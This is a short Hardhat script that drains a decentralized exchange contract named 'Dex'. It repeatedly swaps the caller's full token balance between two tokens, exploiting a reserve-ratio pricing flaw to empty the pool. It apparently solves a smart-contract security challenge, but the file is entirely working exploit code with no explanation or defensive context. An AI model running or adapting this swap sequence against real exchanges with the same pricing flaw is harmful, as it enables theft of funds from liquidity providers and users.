import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const dex = await ethers.getContractAt("Dex", "0xa4063CaCf573B92b4796f7eA8c41Ed6eEA0203Ee");

  const token1 = await dex.token1();
  const token2 = await dex.token2();

  let tx = await dex.approve(dex.address, ethers.constants.MaxUint256);
  await tx.wait(1);
  console.log("approve done")

  tx = await dex.swap(token1, token2, await dex.balanceOf(token1, signer.address));
  await tx.wait(1);
  console.log("first swap done")

  tx = await dex.swap(token2, token1, await dex.balanceOf(token2, signer.address));
  await tx.wait(1);
  console.log("second swap done")

  tx = await dex.swap(token1, token2, await dex.balanceOf(token1, signer.address));
  await tx.wait(1);
  console.log("third swap done")

  tx = await dex.swap(token2, token1, await dex.balanceOf(token2, signer.address));
  await tx.wait(1);
  console.log("fourth swap done")

  tx = await dex.swap(token1, token2, await dex.balanceOf(token1, signer.address));
  await tx.wait(1);
  console.log("fifth swap done")

  tx = await dex.swap(token2, token1, await dex.balanceOf(token2, dex.address));
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
